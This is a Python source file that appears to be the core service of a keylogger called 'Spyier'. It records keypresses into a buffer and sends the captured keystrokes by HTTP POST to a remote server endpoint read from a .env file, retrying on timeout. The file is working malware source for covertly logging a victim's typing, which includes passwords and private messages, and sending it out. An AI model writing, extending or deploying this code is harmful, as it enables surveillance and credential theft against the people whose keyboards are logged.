import os
import sys
import requests
import logging
import time
from src.repositories import keylogger_repository

from dotenv import load_dotenv

load_dotenv() 

BUFFFER_FILE = os.getenv('BUFFER_FILE')
SPYIER_HTTP_SERVER_ENDPOINT = os.getenv('SPYIER_HTTP_SERVER_ENDPOINT')

def set_keypress(key, exception = False):
    try:
        if (exception):
            keylogger_repository.set_keypress(f'Key pressed: {key}\n')

        else:
            keylogger_repository.set_keypress(f'Key pressed: {key.char}\n')

    except Exception:
        set_keypress(key, exception=True)

def get_keypress():
    try:
        keylogger_repository.get_keypress()

    except Exception as error:
        logging.error(error)


def send_keypress():
    keypress = keylogger_repository.get_keypress()

    if not keypress.strip():
        return

    try:
        requests.post(SPYIER_HTTP_SERVER_ENDPOINT, json={'keypress': keypress})
        keylogger_repository.reset_buffer()

    except requests.exceptions.Timeout:
        logging.warning('Timeout error! Trying again in 30 seconds.')

        time.sleep(30)
        send_keypress()


    except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
        logging.error('Invalid url! Fix SPYIER_HTTP_SERVER_ENDPOINT in the .env file')
        sys.exit()
